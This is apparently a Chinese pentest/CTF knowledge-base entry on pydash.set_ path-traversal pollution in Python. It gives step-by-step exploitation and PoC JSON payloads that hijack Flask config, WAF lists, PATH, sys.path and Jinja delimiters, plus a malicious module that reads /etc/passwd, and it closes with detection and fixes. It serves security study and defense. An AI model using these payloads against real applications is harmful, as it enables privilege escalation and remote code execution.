---
id: web-python-pydash-set-attribute-path-pollution
title: pydash.set_ 路径穿越导致 Python 类属性、模块全局与 Flask/Jinja 配置污染
type: scenario
domain: web
path: web/python
technique: pydash-set-path-traversal-pollution
aliases:
- pydash 原型链污染
- pydash.set_ 属性污染
- __init__.__globals__ 污染
- Flask 配置劫持
- sys.path 导入劫持
- Jinja2 定界符污染
tags:
- python
- pydash
- attribute-pollution
- flask
- jinja2
- prototype-pollution
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: <6.0.0（原文标记；另称部分未正确过滤的新版本亦可能受影响）
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T01:17:57+08:00'
  notes: 已对照 11 张图核对 __class__.is_admin、__init__.__globals__ 下的 WAF/Flask 配置/Jinja 定界符/sys.path 污染与 RCE；已修正“PATH 劫持经截图验证”的过度表述（原文仅文字描述）；未验证点：未在本机复现
---

## 一句话结论

pydash 的 `set_(obj, path, value)` 允许用点分路径写到任意属性；旧版未拦截 `__class__`、`__init__`、`__globals__` 等魔术属性时，攻击者可从普通对象跳出作用域，篡改类变量、模块全局、Flask 配置、`os.environ`、`sys.path` 和 Jinja2 环境，实现提权、WAF 绕过与 RCE。

## 原理

- `pydash.set_(obj, path, value)` 按 `.` 拆分 `path`，逐段对当前对象取属性/键并在缺失时创建中间容器，最后写入 `value`。问题在于路径段没有禁止双下划线属性，`getattr` 会正常返回 `__class__`、`__init__`、`__globals__` 等。
- 路径起点取决于 `obj` 类型：
  - `obj` 是字典时，`set_` 优先按键查找，`__init__` 会被当成普通 key；需要先用 `__class__` 跳出字典的键值逻辑，进入 `dict` 类对象后再走 `__init__.__globals__`。
  - `obj` 是类实例时，可直接用 `__init__.__globals__` 取到定义该方法的模块全局字典。
- 拿到 `__globals__` 后即可修改模块级变量：类变量（所有实例共享）、WAF 黑名单、配置对象、函数返回值判断等。
- 在 Flask 应用中，`__globals__['app']` 暴露应用对象，`app.config` 是可变字典，`SECRET_KEY`、`DEBUG` 等可被覆盖；`app.jinja_env` 的 `variable_start_string`/`variable_end_string`/`globals`/`jinja_loader.searchpath` 可被改写。
- `os.environ` 是进程级映射，改写 `PATH` 后，代码中未使用绝对路径的 `subprocess`/`os.system` 调用会从攻击者目录解析同名程序。
- `sys.path` 是模块搜索路径列表；篡改后可让之后才导入的模块从攻击者目录加载。`sys.modules` 已有缓存，已导入模块（如 `os`、`sys`）不会被 `sys.path` 影响。
- 污染发生在进程全局，影响不限于当前请求，可持久到进程重启。

## 触发条件

- 应用使用受影响版本的 pydash，并把用户可控的 `key`/`path` 与 `value` 传入 `pydash.set_`（如合并配置、更新用户字段、通用 setter 接口）；
- 入口可被外部访问，且 value 能承载字符串/布尔/数组等 JSON 可序列化类型；
- 目标对象是字典或应用内实例，能通过上述路径到达模块全局；
- 若走 RCE 链，还需可上传文件（`os.environ` 路径劫持）或可触发懒加载 import（`sys.path` 劫持）。

## 利用步骤

1. 找到调用 `pydash.set_` 的入口，确认 `obj` 是字典还是实例，以及 `key`/`value` 是否完全可控。
2. 用无害路径（如 `foo.bar`）确认写入成功与回显。
3. 按目标选择起点：实例用 `__init__.__globals__...`；字典用 `__class__.__init__.__globals__...`（若字典路径不通，尝试 `__class__` 直接改类属性）。
4. 按目的写入：
   - 提权：`__class__.is_admin` = `true`；
   - Flask 配置：`__init__.__globals__.app.config.SHOW_THE_FLAG` = `true`，或改 `SECRET_KEY`/`DEBUG`；
   - WAF 绕过：`__init__.__globals__.GLOBAL_WAF_BLOCKLIST` = `[]`；
   - 命令劫持：`__init__.__globals__.os.environ.PATH` = `/tmp/ctf_uploads:/usr/bin:/bin`；
   - 导入劫持：`__init__.__globals__.sys.path` = `["/tmp/ctf_uploads"]`；
   - Jinja 绕过：改 `variable_start_string`/`variable_end_string` 为 `[[`/`]]`，或改 `jinja_loader.searchpath`。
5. 访问对应业务接口验证效果；命令/导入劫持需先把可执行文件或恶意的同名 `.py` 上传到可控目录。

## PoC

```http
POST /api/pollute HTTP/1.1
Host: target
Content-Type: application/json

{"key":"__class__.is_admin","value":true}
```

```json
{"key":"__init__.__globals__.app.config.SHOW_THE_FLAG","value":true}
{"key":"__init__.__globals__.GLOBAL_WAF_BLOCKLIST","value":[]}
{"key":"__init__.__globals__.os.environ.PATH","value":"/tmp/ctf_uploads:/usr/bin:/bin"}
{"key":"__init__.__globals__.sys.path","value":["/tmp/ctf_uploads"]}
{"key":"__init__.__globals__.app.jinja_env.variable_start_string","value":"[["}
{"key":"__init__.__globals__.app.jinja_env.variable_end_string","value":"]]"}
```

Jinja 定界符被改成 `[[ ]]` 后，原本被过滤的 `{{ config }}` 可写成 `[[config]]` 触发模板求值。`sys.path` 劫持需配合上传同名模块：

```python
# /tmp/ctf_uploads/malicious_plugin.py
import os
def run():
    return os.popen('id; cat /etc/passwd').read()
```

## 变体与关联

- 同类库：其它提供点分路径 setter 的 Python 工具库（如 lodash 风格的 `set`/`update`）若未过滤 dunder，也有相同风险。
- 起点变体：`__class__`、`__base__`、`__mro__`、`__init__.__globals__`、`__globals__`（函数对象）；拿到 `__builtins__` 后可进一步取 `__import__`。
- 影响变体：改 `app.config.DEBUG` 开调试台、改 `SECRET_KEY` 伪造 session、改 `jinja_env.globals` 注入函数、改 `jinja_loader.searchpath` 渲染任意模板。
- 注意：JSON 无法直接序列化 module 对象，`jinja_env.globals.os` 这类“写入模块对象”的 payload 仅在能传对象时可用；一般用改配置/定界符/路径的方式。
- 关联：[[web-python-ssti-jinja2-flask-globals-rce]]（SSTI 全局链）；[[web-python-framework-flask-werkzeug-debug-pin-forgery]]（Flask 调试台利用）；[[web-nodejs-prototype-pollution-merge-json-parse]]（JS 原型链污染的对应思路）。
- 影响边界：原文截图验证类属性提权、WAF 清空、配置读取 flag、Jinja 定界符绕过、sys.path 导入 RCE；PATH 命令劫持仅在文中给出思路（无截图）；真实目标的影响取决于可达的全局对象与文件上传能力。

## 检测与防御

- 检测：请求体/参数中出现 `__class__`、`__init__`、`__globals__`、`__base__`、`sys.path`、`os.environ`、`jinja_env` 等路径段；`pydash.set_` 调用点收到含点号且带双下划线的 key；进程环境变量、`sys.path`、Flask 配置在运行期被异常修改。
- 修复：升级 pydash 至 6.0.0 及以上；不要把用户输入直接作为 `set_` 的 path，改为固定字段映射/白名单，只允许预期键名。
- 缓解：对路径段做严格正则（仅字母数字下划线、禁止 `__`）；限制进程对上传目录的执行权限；Flask 关闭 DEBUG、轮换 SECRET_KEY；以低权限运行 Web 进程。
